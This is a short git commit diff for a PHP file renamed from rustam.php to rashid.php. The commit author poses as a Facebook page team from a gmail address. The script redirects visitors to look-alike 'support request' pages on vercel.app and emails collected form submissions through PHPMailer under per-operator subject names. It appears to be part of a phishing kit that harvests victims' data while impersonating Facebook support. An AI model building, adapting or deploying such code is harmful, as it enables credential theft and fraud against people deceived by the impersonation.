a0db3742a2410ee0ea7ebd1f33594b86af89897f
facebookpageteam <facebook.page.teams.blue.service@gmail.com>
2025-07-19 23:50:28 +0800

    Update and rename rustam.php to rashid.php

--- rashid.php
+++ rashid.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://for-team-support-request-here-servi.vercel.app/");
+header("Location: https://support-page-here-request-on-servic.vercel.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
@@ -43,7 +43,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'RUSTAM';
+        $mail->Subject = 'RASHID';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
         // Send email
